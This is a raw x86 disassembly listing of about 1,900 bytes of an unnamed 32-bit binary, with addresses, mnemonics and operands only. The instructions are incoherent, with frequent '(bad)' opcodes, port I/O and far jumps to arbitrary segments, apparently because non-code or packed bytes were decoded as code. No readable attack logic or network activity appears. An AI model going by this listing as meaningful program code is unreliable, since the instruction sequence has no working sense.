  407b46:	test   al,0x87
  407b48:	stos   DWORD PTR es:[edi],eax
  407b49:	rcr    BYTE PTR [ecx],0x51
  407b4c:	dec    ebx
  407b4d:	lods   eax,DWORD PTR ds:[esi]
  407b4e:	je     0x407b48
  407b50:	xor    bl,BYTE PTR [edx]
  407b52:	scas   al,BYTE PTR es:[edi]
  407b53:	sti    
  407b54:	push   es
  407b55:	jae    0x407ba8
  407b57:	push   esp
  407b58:	xchg   ebp,eax
  407b59:	and    DWORD PTR [edx],ecx
  407b5b:	add    ah,BYTE PTR [ebx-0x55]
  407b5e:	mov    cl,0x87
  407b60:	ss lock sbb eax,0x7
  407b65:	ret    
  407b66:	mov    bl,0x31
  407b68:	fbld   TBYTE PTR [edx+0x53e655b9]
  407b6e:	ja     0x407bd6
  407b70:	enter  0xa0df,0xfd
  407b74:	dec    esi
  407b75:	fdivr  DWORD PTR [esi]
  407b77:	sbb    eax,0xb0dc35f3
  407b7c:	frstor [ecx+eiz*2+0x24]
  407b80:	dec    esi
  407b81:	pop    ebp
  407b82:	lea    ebx,[esi-0x1]
  407b85:	cli    
  407b86:	xchg   DWORD PTR ds:0x7e6ab422,esi
  407b8c:	cs in  al,0x66
  407b8f:	dec    edx
  407b90:	mov    ds:0x7266006b,eax
  407b95:	push   cs
  407b96:	inc    esi
  407b97:	push   0x481d162e
  407b9c:	test   al,0xc9
  407b9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b9f:	sub    ah,BYTE PTR [ebp-0x184e80e9]
  407ba5:	scas   eax,DWORD PTR es:[edi]
  407ba6:	das    
  407ba7:	or     BYTE PTR [ecx+0x77c4e83],bh
  407bad:	jno    0x407b6c
  407baf:	inc    eax
  407bb0:	sbb    DWORD PTR [edi+ecx*2+0x1487530e],ecx
  407bb7:	inc    edi
  407bb8:	xchg   DWORD PTR [edi-0x17],edx
  407bbb:	xchg   esp,eax
  407bbc:	inc    ecx
  407bbd:	xlat   BYTE PTR ds:[ebx]
  407bbe:	mov    WORD PTR [ebx],?
  407bc0:	sub    BYTE PTR [edi-0x2e],bh
  407bc3:	jle    0x407b7b
  407bc5:	pop    ebp
  407bc6:	fisttp DWORD PTR ds:0xa11f705c
  407bcc:	push   0x15
  407bce:	mov    dh,0x6a
  407bd0:	sbb    DWORD PTR [eax+0x6117fd7],0xc41c5f94
  407bda:	push   es
  407bdb:	jge    0x407c15
  407bdd:	dec    esp
  407bde:	mov    WORD PTR [ebx],es
  407be0:	mov    dl,cl
  407be2:	out    0x7,eax
  407be4:	adc    DWORD PTR [ebx+ebp*2],esp
  407be7:	out    dx,al
  407be8:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bea:	sbb    cl,BYTE PTR [ebp-0xa]
  407bed:	jecxz  0x407bf3
  407bef:	inc    ebp
  407bf0:	and    DWORD PTR [ecx+eiz*2+0x28],eax
  407bf4:	jge    0x407be8
  407bf6:	dec    esi
  407bf7:	imul   esp,DWORD PTR [ebx-0x378c3eeb],0x35
  407bfe:	or     BYTE PTR [ecx],dh
  407c00:	inc    ecx
  407c01:	add    BYTE PTR [ebp+eax*8-0x47790c0d],0x64
  407c09:	jg     0x407c40
  407c0b:	fld    st(6)
  407c0d:	pop    eax
  407c0e:	xlat   BYTE PTR ds:[ebx]
  407c0f:	cwde   
  407c10:	int3   
  407c11:	mov    cl,0xfd
  407c13:	push   ss
  407c14:	dec    eax
  407c15:	add    eax,0xa45e4fa6
  407c1a:	inc    edx
  407c1b:	jns    0x407bad
  407c1d:	inc    edi
  407c1e:	adc    eax,0x3b4613e1
  407c23:	jge    0x407c01
  407c25:	add    bh,BYTE PTR [ecx+0x7f]
  407c28:	addr16 adc bl,dh
  407c2b:	pop    eax
  407c2c:	xchg   ecx,eax
  407c2d:	push   eax
  407c2e:	and    al,0x49
  407c30:	sbb    dl,BYTE PTR [eax-0x60a56cc1]
  407c36:	mov    ?,WORD PTR [ebx+0x6f]
  407c39:	jecxz  0x407cba
  407c3b:	dec    edi
  407c3c:	jae    0x407c5f
  407c3e:	int    0x79
  407c40:	mov    ebp,0xed0d5e9
  407c45:	je     0x407ca9
  407c47:	adc    eax,0x3b60221
  407c4c:	push   ebx
  407c4d:	jo     0x407c3c
  407c4f:	adc    BYTE PTR [eax+0x3e90c438],ah
  407c55:	add    esi,eax
  407c57:	lods   al,BYTE PTR ds:[esi]
  407c58:	xor    cl,BYTE PTR [ecx+0x6c41c63f]
  407c5e:	rcr    DWORD PTR [edi],1
  407c60:	stos   DWORD PTR es:[edi],eax
  407c61:	aas    
  407c62:	dec    esi
  407c63:	outs   dx,DWORD PTR ds:[esi]
  407c64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c65:	sti    
  407c66:	out    dx,eax
  407c67:	cmp    DWORD PTR [esi-0x7bfd2a15],edi
  407c6d:	mov    ecx,gs
  407c6f:	(bad)  
  407c70:	addr16 mov esp,0xb02a24d8
  407c76:	call   0x5e4ff1e0
  407c7b:	sbb    al,0xab
  407c7d:	dec    esi
  407c7e:	mov    ?,WORD PTR [esp+ebp*8-0xe]
  407c82:	cmp    al,0xb
  407c84:	mov    al,ds:0xc0a0c834
  407c89:	loope  0x407ce9
  407c8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c8c:	and    BYTE PTR [ebp+0x18a6d7a1],ch
  407c92:	jb     0x407ceb
  407c94:	scas   al,BYTE PTR es:[edi]
  407c95:	ret    0x4c
  407c98:	fst    DWORD PTR [ecx+0x54495ac0]
  407c9e:	bound  ecx,QWORD PTR [ebx]
  407ca0:	ja     0x407d0b
  407ca2:	jmp    0x3f0e76dd
  407ca7:	xor    BYTE PTR [ebx+0x31e7310f],bh
  407cad:	ins    DWORD PTR es:[edi],dx
  407cae:	mov    ch,dl
  407cb0:	out    0x37,eax
  407cb2:	sbb    ebx,esp
  407cb4:	sti    
  407cb5:	sbb    edx,DWORD PTR [edx+eax*8]
  407cb8:	ds bound esi,QWORD PTR gs:[ecx+0x61]
  407cbd:	lods   al,BYTE PTR ds:[esi]
  407cbe:	retf   
  407cbf:	xor    eax,ebp
  407cc1:	std    
  407cc2:	stos   DWORD PTR es:[edi],eax
  407cc3:	retf   0xca64
  407cc6:	js     0x407c88
  407cc8:	icebp  
  407cc9:	jp     0x407c90
  407ccb:	cmp    eax,0xe9e9762d
  407cd0:	out    0x19,eax
  407cd2:	out    dx,al
  407cd3:	out    dx,eax
  407cd4:	fld    TBYTE PTR [ebp+ebp*8-0x34]
  407cd8:	jns    0x407c5c
  407cda:	pop    eax
  407cdb:	das    
  407cdc:	dec    ecx
  407cdd:	adc    eax,0xefd6ceb1
  407ce2:	stos   DWORD PTR es:[edi],eax
  407ce3:	xchg   cl,bl
  407ce5:	sbb    DWORD PTR [ebp+edi*4+0x36],0xffffffa3
  407cea:	loop   0x407d21
  407cec:	dec    ebx
  407ced:	loope  0x407d41
  407cef:	ja     0x407d2c
  407cf1:	add    dh,al
  407cf3:	push   ss
  407cf4:	xor    DWORD PTR [eax+0x2319f548],0xbbc78711
  407cfe:	lods   eax,DWORD PTR ds:[esi]
  407cff:	xor    eax,0x3cf382f0
  407d04:	ror    DWORD PTR [ebx-0x41c0a432],1
  407d0a:	dec    esp
  407d0b:	test   DWORD PTR [edi-0x79b5161d],esi
  407d11:	in     al,0xa0
  407d13:	pop    ecx
  407d14:	xchg   ebp,eax
  407d15:	jge    0x407ccd
  407d17:	mov    ah,0x1e
  407d19:	pop    ebp
  407d1a:	push   ss
  407d1b:	ret    
  407d1c:	jge    0x407ce3
  407d1e:	dec    eax
  407d1f:	cdq    
  407d20:	shr    DWORD PTR [edi-0x3c],1
  407d23:	mov    ds,WORD PTR [esi-0x14]
  407d26:	xchg   esp,eax
  407d27:	hlt    
  407d28:	cmp    eax,0xd6679852
  407d2d:	fdivr  DWORD PTR [ebx]
  407d2f:	xor    ebx,DWORD PTR [eax-0x2]
  407d32:	mov    WORD PTR [esi+eax*4],?
  407d35:	cmc    
  407d36:	push   ebp
  407d37:	or     DWORD PTR [edx+ebx*8],esi
  407d3a:	adc    edi,DWORD PTR [edi]
  407d3c:	and    ebp,ebx
  407d3e:	or     DWORD PTR [esi-0x113fcbf6],0x21
  407d45:	popf   
  407d46:	shl    eax,1
  407d48:	fistp  DWORD PTR [eax+esi*1+0x662c4e21]
  407d4f:	mov    esi,0x3c8d5dc5
  407d54:	lods   al,BYTE PTR ds:[esi]
  407d55:	sbb    DWORD PTR [ebx],0xe4d89bd4
  407d5b:	adc    al,0xcd
  407d5d:	enter  0x666f,0xa3
  407d61:	push   ebp
  407d62:	ins    DWORD PTR es:[edi],dx
  407d63:	cmp    BYTE PTR [ebp+0x35959d98],cl
  407d69:	mov    edi,0x7f3cf4db
  407d6e:	sbb    BYTE PTR [edx+0x1aa8a365],dh
  407d74:	mov    ebx,ds
  407d76:	lock lahf 
  407d78:	aam    0x8e
  407d7a:	jno    0x407d37
  407d7c:	mov    dl,0x3a
  407d7e:	jns    0x407d7d
  407d80:	repz mov al,BYTE PTR [esi]
  407d83:	mov    al,BYTE PTR [edi]
  407d85:	sar    BYTE PTR [edx],cl
  407d87:	in     al,dx
  407d88:	jmp    0xe814:0xe571c01f
  407d8f:	and    ch,BYTE PTR [ecx-0x35]
  407d92:	ror    BYTE PTR [eax],1
  407d94:	push   ss
  407d95:	fild   WORD PTR [edx+edx*4-0x15]
  407d99:	dec    esi
  407d9a:	jmp    0x407de8
  407d9c:	push   0x2c
  407d9e:	sbb    BYTE PTR [ebx-0x7d004ab],0x19
  407da5:	mov    esp,DWORD PTR [esp+eiz*4+0x23794ab0]
  407dac:	ins    DWORD PTR es:[edi],dx
  407dad:	push   esi
  407dae:	ins    DWORD PTR es:[edi],dx
  407daf:	mov    dh,0xe3
  407db1:	in     al,0x6f
  407db3:	mov    ebx,0x5e3d85fc
  407db8:	ins    BYTE PTR es:[edi],dx
  407db9:	inc    ebp
  407dba:	sub    DWORD PTR [ecx],0xfffffff8
  407dbd:	pop    esp
  407dbe:	outs   dx,BYTE PTR ds:[esi]
  407dbf:	sahf   
  407dc0:	test   BYTE PTR [edx+0x4e],ch
  407dc3:	and    al,0x58
  407dc5:	mov    dh,0xe1
  407dc7:	aaa    
  407dc8:	push   ebp
  407dc9:	and    al,0xa8
  407dcb:	push   ds
  407dcc:	pusha  
  407dcd:	pop    esi
  407dce:	dec    edi
  407dcf:	mov    DWORD PTR [eax-0x6c75c6a],ecx
  407dd5:	test   DWORD PTR [ebp-0x67],edi
  407dd8:	out    dx,al
  407dd9:	jl     0x407e21
  407ddb:	mov    esp,0x8c11626a
  407de0:	and    eax,0x6bcdb38f
  407de5:	(bad)  
  407de6:	jmp    0xac33:0x2f2f5973
  407ded:	push   edx
  407dee:	inc    esp
  407def:	shl    DWORD PTR [ecx-0x20],1
  407df2:	ret    
  407df3:	sbb    ebp,edi
  407df5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407df6:	and    ecx,DWORD PTR [ebx-0x68]
  407df9:	ins    DWORD PTR es:[edi],dx
  407dfa:	(bad)  
  407dfb:	sbb    BYTE PTR [edx],al
  407dfd:	repz adc ah,ah
  407e00:	and    al,0xf7
  407e02:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e04:	cmp    al,0x87
  407e06:	repnz mov WORD PTR [ebp+0x55dcc4ce],cs
  407e0d:	gs cs dec ebx
  407e10:	push   ds
  407e11:	sbb    DWORD PTR [ebx-0x4a],esp
  407e14:	adc    al,0x2a
  407e16:	popa   
  407e17:	fst    DWORD PTR [ebp+0x1adf8071]
  407e1d:	mov    ah,0xe0
  407e1f:	jno    0x407dba
  407e21:	jne    0x407e3b
  407e23:	xchg   edx,eax
  407e24:	int3   
  407e25:	pop    edx
  407e26:	sbb    bh,BYTE PTR [esi-0x27a21837]
  407e2c:	sahf   
  407e2d:	inc    ebp
  407e2e:	out    0x7c,eax
  407e30:	aad    0x6e
  407e32:	pop    eax
  407e33:	int    0xda
  407e35:	lock into 
  407e37:	addr16 nop
  407e39:	xchg   ecx,eax
  407e3a:	pop    ss
  407e3b:	popf   
  407e3c:	jno    0x407e42
  407e3e:	mov    edx,0x7e30f158
  407e43:	scas   eax,DWORD PTR es:[edi]
  407e44:	xchg   DWORD PTR [esi+0x280efa67],esi
  407e4a:	out    0x35,al
  407e4c:	(bad)
  407e4f:	es jmp 0x407e58
  407e52:	test   BYTE PTR [ebx+ebp*2-0x25630499],bh
  407e59:	jns    0x407e0b
  407e5b:	imul   esp,DWORD PTR [ecx+0xefadbba],0x1c
  407e62:	inc    ecx
  407e63:	inc    esp
  407e64:	fild   WORD PTR [edi]
  407e66:	(bad)  
  407e67:	mov    bl,ch
  407e69:	or     DWORD PTR [esi-0x25],edx
  407e6c:	dec    ecx
  407e6d:	arpl   cx,cx
  407e6f:	ret    0x5262
  407e72:	push   esi
  407e73:	clc    
  407e74:	call   0xb46b:0xa4500c1e
  407e7b:	bound  esp,QWORD PTR [edi-0x6b]
  407e7e:	fisub  WORD PTR [edi-0x7c958498]
  407e84:	int3   
  407e85:	xchg   esi,eax
  407e86:	cli    
  407e87:	push   0xffffffef
  407e89:	inc    ecx
  407e8a:	adc    eax,0x6e9ade2b
  407e8f:	mov    bh,0xea
  407e91:	inc    ebx
  407e92:	in     eax,0xd5
  407e94:	popa   
  407e95:	mov    bl,ch
  407e97:	jle    0x407ea8
  407e99:	dec    esi
  407e9a:	out    dx,eax
  407e9b:	(bad)  
  407e9c:	inc    BYTE PTR ds:0xc1398606
  407ea2:	retf   0xfc0e
  407ea5:	ins    DWORD PTR es:[edi],dx
  407ea6:	adc    DWORD PTR [ecx],esp
  407ea8:	xlat   BYTE PTR ds:[ebx]
  407ea9:	sbb    al,0xec
  407eab:	aad    0x33
  407ead:	adc    eax,0xc2148a35
  407eb2:	sbb    esp,DWORD PTR [edi+0x5184b11e]
  407eb8:	inc    esi
  407eb9:	cmp    al,0xc1
  407ebb:	and    eax,0x514187e6
  407ec0:	(bad)  
  407ec2:	push   eax
  407ec3:	jnp    0x407f3b
  407ec5:	and    eax,0x95f99824
  407eca:	jp     0x407ea4
  407ecc:	in     al,dx
  407ecd:	xlat   BYTE PTR ds:[ebx]
  407ece:	or     edx,ebx
  407ed0:	pop    es
  407ed1:	fcom   DWORD PTR [eax-0x43d1fed3]
  407ed7:	mov    dl,0x28
  407ed9:	xor    al,0x20
  407edb:	sbb    eax,0x7a65858f
  407ee0:	call   0xe0a3:0xc74f33f2
  407ee7:	fdiv   QWORD PTR [ebp+0x1e]
  407eea:	mov    bh,0x3b
  407eec:	dec    eax
  407eed:	sbb    ah,BYTE PTR [ebp+0x72e5a3b1]
  407ef3:	cwde   
  407ef4:	fwait
  407ef5:	adc    BYTE PTR [ebx-0x481a593e],cl
  407efb:	gs push esi
  407efd:	xor    edx,DWORD PTR [eax+0x52ec4bdd]
  407f03:	pop    eax
  407f04:	xor    eax,0xf72164ba
  407f09:	cwde   
  407f0a:	jae    0x407f00
  407f0c:	clc    
  407f0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f0e:	frstor [edx]
  407f10:	mov    al,0x7a
  407f12:	pop    ecx
  407f13:	repz ds adc al,0x2f
  407f17:	sub    bh,ch
  407f19:	hlt    
  407f1a:	in     eax,dx
  407f1b:	and    eax,0x7bfa2aa6
  407f20:	cmp    bh,BYTE PTR [ebx+0x4df5cc7a]
  407f26:	ja     0x407ee4
  407f28:	outs   dx,BYTE PTR ds:[esi]
  407f29:	xchg   esi,eax
  407f2a:	repnz cmc 
  407f2c:	pop    eax
  407f2d:	fdivp  st(4),st
  407f2f:	sub    eax,ecx
  407f31:	repz call 0x4921:0x3d45b715
  407f39:	je     0x407f29
  407f3b:	push   es
  407f3c:	popf   
  407f3d:	sub    esi,DWORD PTR [edi-0x3d]
  407f40:	dec    ebx
  407f41:	or     esp,ebp
  407f43:	dec    ebx
  407f44:	or     DWORD PTR [eax+0x2462be96],ebp
  407f4a:	les    esp,FWORD PTR [edi-0x54068fd8]
  407f50:	push   edi
  407f51:	pop    edi
  407f52:	jns    0x407f9a
  407f54:	in     al,dx
  407f55:	(bad)  
  407f56:	push   edx
  407f57:	int    0x5a
  407f59:	push   edi
  407f5a:	push   esi
  407f5b:	mov    ah,0xd
  407f5d:	inc    eax
  407f5e:	div    BYTE PTR [edi+0x400642ee]
  407f64:	cmp    edi,0x2a
  407f67:	xchg   BYTE PTR [edi+0x58],ah
  407f6a:	and    al,0x99
  407f6c:	hlt    
  407f6d:	int    0x9f
  407f6f:	(bad)  
  407f70:	sti    
  407f71:	mov    ah,0x76
  407f73:	cmp    eax,0xa45fc616
  407f78:	retf   
  407f79:	test   eax,0x28d84283
  407f7e:	inc    edx
  407f7f:	fwait
  407f80:	cmp    edi,DWORD PTR [ebx-0x7e]
  407f83:	cld    
  407f84:	mov    esp,0xa8f5d71
  407f89:	clc    
  407f8a:	or     ebp,DWORD PTR [ecx]
  407f8c:	fisttp QWORD PTR [eax-0x2a50f00a]
  407f92:	or     cl,BYTE PTR [esi+edx*1+0x58]
  407f96:	mov    DWORD PTR [edi],eax
  407f98:	and    al,0xb7
  407f9a:	(bad)  
  407f9b:	jne    0x407fbc
  407f9d:	std    
  407f9e:	jg     0x407fe4
  407fa0:	retf   0x59df
  407fa3:	sub    al,0x2a
  407fa5:	inc    ebp
  407fa6:	dec    edx
  407fa7:	frstor [edi+0x6f2573ea]
  407fad:	sub    DWORD PTR [ecx],edx
  407faf:	out    0x44,eax
  407fb1:	xchg   DWORD PTR [ebp-0x59],ebp
  407fb4:	pop    esi
  407fb5:	loop   0x407f87
  407fb7:	sti    
  407fb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fb9:	mov    ebx,0x8c7c54c7
  407fbe:	pop    ebp
  407fbf:	sbb    DWORD PTR [ecx],ebp
  407fc1:	and    edi,DWORD PTR [edx+0x3dcf9f2c]
  407fc7:	sub    BYTE PTR [ecx-0x32d0c27d],0x7d
  407fce:	push   ebp
  407fcf:	(bad)  
  407fd0:	xor    dh,bl
  407fd2:	std    
  407fd3:	pushf  
  407fd4:	xchg   ebx,eax
  407fd5:	popa   
  407fd6:	pushf  
  407fd7:	inc    ebx
  407fd8:	repnz mov cl,BYTE PTR [edx+0x44]
  407fdc:	or     eax,0x14d75758
  407fe1:	fmul   QWORD PTR [ecx+0x1c611f5d]
  407fe7:	or     esp,DWORD PTR [esi+0x7e67476a]
  407fed:	mov    bl,0x95
  407fef:	jg     0x407fce
  407ff1:	jb     0x407f88
  407ff3:	add    eax,0xaf912069
  407ff8:	pop    edx
  407ff9:	cmp    edx,0xffffffe2
  407ffc:	jecxz  0x407fa7
  407ffe:	push   cs
  407fff:	int    0xd
  408001:	dec    edx
  408002:	test   DWORD PTR ds:0x20e6a8c1,0x386d0d5
  40800c:	mov    esi,0xdb6c5111
  408011:	out    dx,eax
  408012:	lds    esp,FWORD PTR [eax-0x7d]
  408015:	stos   DWORD PTR es:[edi],eax
  408016:	push   es
  408017:	mov    edi,0xbffc6187
  40801c:	push   es
  40801d:	inc    esi
  40801e:	out    0xf9,al
  408020:	mov    DWORD PTR [eax+0x54],eax
  408023:	xchg   edi,eax
  408024:	mov    edi,0xcc168d41
  408029:	fld    QWORD PTR [ebx]
  40802b:	test   eax,0xc7148fe6
  408030:	pop    edi
  408031:	mov    edi,0x1491d5a
  408036:	popf   
  408037:	add    eax,0x3f7a7bd6
  40803c:	iret   
  40803d:	test   al,0x54
  40803f:	arpl   WORD PTR [ebp+0x29c62be7],sp
  408045:	out    dx,eax
  408046:	call   0x142e:0x8f5b143d
  40804d:	inc    esi
  40804e:	add    DWORD PTR [ecx*1+0x51235a2e],ebx
  408055:	ins    BYTE PTR es:[edi],dx
  408056:	mov    edi,0x64f69f9
  40805b:	inc    esp
  40805c:	cmc    
  40805d:	popf   
  40805e:	pop    eax
  40805f:	mov    ds:0x73907259,al
  408064:	inc    ebp
  408065:	nop
  408066:	lods   eax,DWORD PTR ds:[esi]
  408067:	test   BYTE PTR [edi],bh
  408069:	test   BYTE PTR fs:[edx+ecx*1],0x7e
  40806e:	push   ebp
  40806f:	add    eax,0xe1f09387
  408074:	shl    edx,0x3d
  408077:	hlt    
  408078:	call   0xf36c:0xca8f49d1
  40807f:	sar    ecx,cl
  408081:	mov    ?,WORD PTR [edx+0x32bcd87d]
  408087:	mov    edx,0x56af169d
  40808c:	rcr    DWORD PTR [ecx-0x82ebc80],0x4
  408093:	aaa    
  408094:	inc    edx
  408095:	xor    al,0x3
  408097:	xchg   edx,eax
  408098:	frstor [ebp-0x5b629f77]
  40809e:	mov    ch,0xc4
  4080a0:	jae    0x4080a3
  4080a2:	jbe    0x40809b
  4080a4:	add    bl,BYTE PTR [ecx]
  4080a6:	sub    eax,0x32b20542
  4080ab:	jg     0x408108
  4080ad:	bound  edx,QWORD PTR [edi]
  4080af:	mov    ds:0x99c9ef1c,eax
  4080b4:	pop    es
  4080b5:	dec    edx
  4080b6:	adc    bh,BYTE PTR [ebx+0x1c75afa9]
  4080bc:	stos   DWORD PTR es:[edi],eax
  4080bd:	and    BYTE PTR [ebp+0x699cb60b],dl
  4080c3:	or     esp,DWORD PTR [edx-0x220580a1]
  4080c9:	int3   
  4080ca:	hlt    
  4080cb:	pop    ebp
  4080cc:	inc    edx
  4080cd:	cs mov edi,0x87bd492a
  4080d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080d4:	mov    cl,0x21
  4080d6:	adc    DWORD PTR [edx+ebx*2-0x15],eax
  4080da:	retf   0xe105
  4080dd:	adc    eax,0x34035107
  4080e2:	xchg   DWORD PTR [ecx+0x33],edi
  4080e5:	iret   
  4080e6:	in     eax,dx
  4080e7:	mov    eax,ds:0x37d6888d
  4080ec:	xchg   DWORD PTR [ebp+0x2fbbea2c],ebp
  4080f2:	dec    eax
  4080f3:	xchg   DWORD PTR [edx],edi
  4080f5:	ins    BYTE PTR es:[edi],dx
  4080f6:	and    bl,BYTE PTR [edx]
  4080f8:	cdq    
  4080f9:	repz les ecx,FWORD PTR [eax+0x62]
  4080fd:	xor    BYTE PTR [ebp+0x2c],ch
  408100:	adc    BYTE PTR [ecx-0x1d],dh
  408103:	adc    edi,DWORD PTR [edi+0x3c]
  408106:	in     eax,dx
  408107:	pop    eax
  408108:	mov    ah,cl
  40810a:	test   BYTE PTR [eax+ecx*2],0x37
  40810e:	popa   
  40810f:	adc    ecx,DWORD PTR [edx]
  408111:	add    ebp,DWORD PTR [edx+esi*4]
  408114:	repz mov ?,WORD PTR [edi+0x54]
  408118:	scas   al,BYTE PTR es:[edi]
  408119:	icebp  
  40811a:	jecxz  0x4080ab
  40811c:	xchg   edi,eax
  40811d:	jo     0x4080d0
  40811f:	sbb    BYTE PTR [ebp-0x2a],dh
  408122:	add    eax,0xb1cae666
  408127:	loope  0x4080ab
  408129:	pop    ds
  40812a:	sahf   
  40812b:	adc    al,0x2f
  40812d:	mov    dl,BYTE PTR [ecx-0x1f]
  408130:	repz jg 0x408149
  408133:	stc    
  408134:	imul   ecx,DWORD PTR [ebx+0x252e1efd],0xffffffab
  40813b:	fcmove st,st(4)
  40813d:	inc    edi
  40813e:	jae    0x4080d0
  408140:	jmp    0x408103
  408142:	fcomp  DWORD PTR [edx+0xa]
  408145:	dec    esi
  408146:	mov    esp,db4
  408149:	loop   0x4081c1
  40814b:	mov    cl,0xbb
  40814d:	ins    DWORD PTR es:[edi],dx
  40814e:	push   ebp
  40814f:	sub    edi,edx
  408151:	std    
  408152:	and    BYTE PTR ds:0xb63efe7f,ah
  408158:	bound  ebp,QWORD PTR [eax]
  40815a:	nop
  40815b:	jae    0x408180
  40815d:	mov    ah,0x3c
  40815f:	adc    al,0x47
  408161:	push   edx
  408162:	mov    cl,0xb1
  408164:	mov    ds:0x1302822e,al
  408169:	das    
  40816a:	sub    eax,0x1b76711d
  40816f:	xchg   esi,eax
  408170:	in     eax,0x10
  408172:	lods   eax,DWORD PTR ds:[esi]
  408173:	dec    ebp
  408174:	test   eax,0x540c468d
  408179:	mov    ds:0xe4bbf2db,eax
  40817e:	(bad)
  408183:	jecxz  0x408134
  408185:	or     ah,BYTE PTR [ebp+0x31]
  408188:	cdq    
  408189:	cmc    
  40818a:	mov    ?,edx
  40818c:	push   ebx
  40818d:	sbb    BYTE PTR [ebp+0x19c55f03],dh
  408193:	jmp    0xd85f:0xf8129157
  40819a:	add    edx,DWORD PTR [ebx+0x16]
  40819d:	push   edi
  40819e:	cmp    dl,BYTE PTR [edi-0x67]
  4081a1:	pop    eax
  4081a2:	(bad)  
  4081a3:	fwait
  4081a4:	jno    0x4081dc
  4081a6:	jecxz  0x408173
  4081a8:	xchg   ebp,eax
  4081a9:	scas   eax,DWORD PTR es:[edi]
  4081aa:	retf   0x3336
  4081ad:	imul   esi,ecx,0xe5412fdd
  4081b3:	(bad)  
  4081b4:	aaa    
  4081b5:	add    al,0x31
  4081b7:	or     BYTE PTR [esi+ebx*2-0x62],bh
  4081bb:	jne    0x40816a
  4081bd:	sbb    al,0xc9
  4081bf:	push   eax
  4081c0:	popa   
  4081c1:	jo     0x408184
  4081c3:	xchg   ebx,eax
  4081c4:	scas   eax,DWORD PTR es:[edi]
  4081c5:	xchg   DWORD PTR [ecx],eax
  4081c7:	outs   dx,BYTE PTR ds:[esi]
  4081c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081c9:	xor    dl,dh
  4081cb:	sbb    al,BYTE PTR [edi-0x2eb1b5e5]
  4081d1:	pop    es
  4081d2:	sahf   
  4081d3:	jg     0x40815f
  4081d5:	fs push 0x1dbdf357
  4081db:	inc    edi
  4081dc:	pop    es
  4081dd:	scas   al,BYTE PTR es:[edi]
  4081de:	jae    0x408222
  4081e0:	fstp   QWORD PTR [edi-0x9]
  4081e3:	jb     0x40820d
  4081e5:	push   ebp
  4081e6:	sti    
  4081e7:	not    ch
  4081e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081ea:	test   al,0x48
  4081ec:	mov    dl,0x49
  4081ee:	test   BYTE PTR [ebp-0x51],al
  4081f1:	push   ebx
  4081f2:	jge    0x4081ac
  4081f4:	mov    dl,0x75
  4081f6:	sbb    DWORD PTR [eax],eax
  4081f8:	ins    DWORD PTR es:[edi],dx
  4081f9:	xchg   DWORD PTR [ecx+0x4edb2927],ecx
  4081ff:	dec    esi
  408200:	cwde   
  408201:	jno    0x4081b1
  408203:	xchg   DWORD PTR [ecx+0x7a],ebx
  408206:	push   0xf41bb59c
  40820b:	cs ret 
  40820d:	xor    esi,DWORD PTR [edi+ebx*1]
  408210:	in     eax,0xf8
  408212:	add    BYTE PTR [edx-0x19],dh
  408215:	(bad)  
  408216:	retf   0x173c
  408219:	shl    BYTE PTR [edx-0x32],cl
  40821c:	pop    edi
  40821d:	pop    edx
  40821e:	in     al,dx
  40821f:	leave  
  408220:	icebp  
  408221:	in     eax,0x10
  408223:	leave  
  408224:	dec    edi
  408225:	stos   BYTE PTR es:[edi],al
  408226:	test   eax,0x62e0aba6
  40822b:	stos   BYTE PTR es:[edi],al
  40822c:	leave  
  40822d:	inc    ebp
  40822e:	cdq    
  40822f:	xchg   edi,eax
  408230:	jmp    0x7f942db2
  408235:	outs   dx,DWORD PTR ds:[esi]
  408236:	enter  0x6ae8,0x1c
  40823a:	js     0x40825e
  40823c:	test   BYTE PTR [esi-0x8],dh
  40823f:	test   al,0x64
  408241:	test   BYTE PTR [ecx-0x52],0x3
  408245:	and    ebp,DWORD PTR [edi-0x589af173]
  40824b:	sub    DWORD PTR [edi],0x24
  40824e:	jmp    0xd253:0x1dcd246e
  408255:	mov    edx,0xb457169e
  40825a:	lods   eax,DWORD PTR ds:[esi]
  40825b:	lahf   
  40825c:	cmp    ebx,edi
  40825e:	ret    0x5796
  408261:	(bad)  
  408262:	fistp  WORD PTR [edi+ecx*1]
  408265:	sub    esi,DWORD PTR [edx-0x17]
  408268:	add    DWORD PTR [eax],0xffffffb1
  40826b:	adc    ebp,DWORD PTR [ecx-0x43de495f]
  408271:	inc    esi
  408272:	out    dx,eax
  408273:	or     ecx,DWORD PTR [ecx-0x36]
  408276:	push   edx
  408277:	idiv   esi
  408279:	push   ebx
  40827a:	and    al,0xbc
  40827c:	out    0xf,al
  40827e:	cmp    al,0x83
  408280:	sub    ebx,ecx
  408282:	mov    ds:0xcd40d2f6,al
  408287:	adc    BYTE PTR [edx-0x34],ch
  40828a:	sti    
  40828b:	seta   BYTE PTR [ebx]
  40828e:	fisttp QWORD PTR [ebx+0x47]
  408291:	adc    ch,BYTE PTR [edx]
  408293:	jne    0x408271
  408295:	mov    cl,0x17
  408297:	mov    esi,DWORD PTR [edi+0x6e]
  40829a:	dec    ebp
  40829b:	scas   eax,DWORD PTR es:[edi]
  40829c:	fsub   QWORD PTR [ecx-0x58]
  40829f:	mov    ebx,0x5d4a5fc
  4082a4:	loopne 0x4082ea
  4082a6:	(bad)
  4082aa:	and    al,0xc6
  4082ac:	mov    ds:0x1737cd3c,eax
  4082b1:	mov    ah,0xce
  4082b3:	(bad)  
  4082b4:	pop    eax
  4082b5:	xor    BYTE PTR [edi],bl
  4082b7:	inc    ebp
  4082b8:	sub    al,0x36
  4082ba:	fstp   QWORD PTR [ebx]
  4082bc:	push   ecx
  4082bd:	jae    0x4082ff
  4082bf:	or     al,al
  4082c1:	lahf   
  4082c2:	inc    ecx
  4082c3:	push   eax
  4082c4:	or     edi,DWORD PTR [ebx-0x4c]
  4082c7:	pop    esi
  4082c8:	jecxz  0x408300
  4082ca:	adc    BYTE PTR [ebp+0x6f],al
